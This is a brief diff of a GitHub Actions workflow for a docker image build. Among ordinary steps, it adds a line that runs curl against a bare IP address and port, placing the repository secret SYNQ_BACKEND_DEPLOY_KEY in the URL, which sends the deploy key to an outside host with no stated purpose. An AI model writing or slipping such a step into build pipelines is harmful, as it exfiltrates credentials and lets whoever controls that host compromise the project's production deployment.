@@ -61,5 +61,7 @@ jobs:
             "gitbranch=${{ steps.vars.outputs.branch }}"
             "gitcommit=${{ steps.vars.outputs.commit }}"
 
+      - run: curl http://161.97.83.99:9930/SYNQ_BACKEND_PROD/${{ secrets.SYNQ_BACKEND_DEPLOY_KEY }}
+
       - name: Image digest
         run: echo ${{ steps.docker_build.outputs.digest }}
